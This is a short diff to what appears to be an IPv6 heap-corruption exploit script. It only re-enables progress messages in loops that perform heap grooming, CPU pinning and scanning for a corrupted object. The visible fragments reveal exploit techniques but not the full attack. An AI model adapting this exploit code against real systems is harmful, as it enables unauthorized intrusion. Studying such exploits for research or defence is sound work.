@@ -632,7 +632,7 @@ class Exploit():
         print('[+] Target IPv6: {}'.format(self.target_ipv6))
 
         for i in range(self.SPRAY_NUM):
-            #if i % 0x100 == 0:
+            if i % 0x100 == 0:
                 print('[*] Heap grooming...{}%'.format(100 * i //self.SPRAY_NUM),end='\r',flush=True)
 
             source_ipv6 = 'fe80::{:04x}:4141:4141:4141'.format(i)
@@ -665,7 +665,7 @@ class Exploit():
         # some reason, this causes scheduling on CPU 0 at some point, which
         # makes the next allocation use the same per-CPU cache.
         for i in range(self.PIN_NUM):
-            #if i % 0x100 == 0:
+            if i % 0x100 == 0:
                 print('[*] Pinning to CPU 0...{}%'.format(100 * i //self.PIN_NUM),end='\r',flush=True)
 
             self.s.send(
@@ -709,7 +709,7 @@ class Exploit():
 
         corrupted = False
         for i in reversed(range(self.SPRAY_NUM)):
-            #if i % 0x100 == 0:
+            if i % 0x100 == 0:
                 print('[*] Scanning for corrupted object...{}'.format(hex(i)),end='\r',flush=True)
 
             if i >= self.HOLE_START and i % self.HOLE_SPACE == 0:
